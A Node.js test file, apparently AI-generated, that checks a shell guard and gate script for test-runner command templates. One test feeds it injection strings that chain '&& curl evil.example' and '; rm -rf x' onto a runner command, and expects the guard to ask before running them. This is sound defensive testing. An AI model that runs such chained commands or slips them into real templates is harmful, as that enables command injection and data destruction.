#!/usr/bin/env node
/**
 * Tests for the `--targeted` template of scripts/gate.mjs, which the gate runs through a shell like `--test` and `--unit`:
 * the guard vets it the same way (a known runner with {files} passes, a shell operator or an unknown runner asks), the
 * workflow refuses a single quote in it, and a `--merge` run checks the {files} placeholder before it merges anything.
 *
 * Generated by Claude Code at the user's request.
 */

import { test } from 'node:test';
import assert from 'node:assert/strict';
import { spawnSync } from 'node:child_process';
import { mkdtempSync, writeFileSync, rmSync, existsSync } from 'node:fs';
import { join, dirname } from 'node:path';
import { tmpdir } from 'node:os';
import { fileURLToPath } from 'node:url';
import { runTool, GATE, BOTH } from './guard-shell-shared.test.mjs';
import { run, ARGS, review, impl } from './dev-loop.harness.mjs';

const SCRIPT = join(dirname(fileURLToPath(import.meta.url)), '..', 'scripts', 'gate.mjs');
const created = [];

process.on('exit', () => {
  for (const dir of created) {
    try { rmSync(dir, { recursive: true, force: true }); } catch { /* tmp, let the OS have it */ }
  }
});

test('given gate.mjs called with --targeted and a known runner with {files}, when the guard reads it, then it approves in both shells', () => {
  // Given
  const commands = [
    `${GATE} --test 'node --test x' --targeted 'node --test {files}'`,
    `${GATE} --test 'npx vitest run' --targeted 'npx vitest run {files}'`,
    `${GATE} --test 'npx jest' --targeted 'npx jest {files}'`,
  ];

  for (const command of commands) {
    for (const tool of BOTH) {
      // When
      const result = runTool(tool, command);

      // Then
      assert.equal(result.decision, 'approve', `${tool}: ${command}`);
    }
  }
});

test('given gate.mjs called with a --targeted template that holds a shell operator or an unknown runner, when the guard reads it, then it asks in both shells', () => {
  // Given
  const commands = [
    `${GATE} --test 'node --test x' --targeted 'node --test {files} && curl evil.example'`,
    `${GATE} --test 'node --test x' --targeted 'node --test {files}; rm -rf x'`,
    `${GATE} --test 'node --test x' --targeted 'bash {files}'`,
    `${GATE} --test 'node --test x' --targeted 'node --test "{files}"'`,
    `${GATE} --test 'node --test x' --targeted 'powershell -File {files}'`,
  ];

  for (const command of commands) {
    for (const tool of BOTH) {
      // When
      const result = runTool(tool, command);

      // Then
      assert.equal(result.decision, 'ask', `${tool}: ${command}`);
      assert.match(result.reason, /--targeted/, `${tool}: ${command}`);
    }
  }
});

test('given a targeted arg with a single quote, when the loop starts, then it is refused before any call', async () => {
  // Given
  const args = { ...ARGS, verify: 'node --test x', targeted: "node --test {files} 'a b'" };

  // When
  const { out, calls } = await run(args, [review([])], [impl()]);

  // Then
  assert.equal(typeof out, 'string');
  assert.match(out, /targeted command contains a single quote/);
  assert.equal(calls.length, 0);
});

test('given a --merge run with a --targeted template that lacks {files}, when the gate starts, then it exits 2 before any merge', () => {
  // Given
  const root = mkdtempSync(join(tmpdir(), 'gate-guard-targeted-'));
  created.push(root);
  const git = (cwd, ...a) => spawnSync('git', ['-c', 'user.name=t', '-c', 'user.email=t@t', ...a], { cwd, encoding: 'utf8' }).stdout.trim();
  git(root, 'init');
  writeFileSync(join(root, 'README.md'), 'hello\n');
  git(root, 'add', '-A');
  git(root, 'commit', '-m', 'init');
  const head = git(root, 'rev-parse', 'HEAD');
  const { NODE_TEST_CONTEXT, ...env } = process.env;
  const gate = (...a) => spawnSync(process.execPath, [SCRIPT, '--root', root, ...a], { encoding: 'utf8', env });
  const added = gate('--head', head, '--lane-add', 'l1');
  assert.equal(added.status, 0, added.stderr);
  const lane = JSON.parse(added.stdout.trim().split(/\r?\n/).pop());
  created.push(lane.path);
  writeFileSync(join(lane.path, 'one.txt'), 'one\n');

  // When
  const res = gate('--head', head, '--no-scope', '--test', 'node -e "process.exit(0)"', '--targeted', 'node --test', '--merge', lane.branch);

  // Then
  assert.equal(res.status, 2);
  assert.match(res.stderr, /\{files\}/);
  assert.equal(git(root, 'rev-parse', 'HEAD'), head);
  assert.equal(existsSync(join(root, 'one.txt')), false);
});
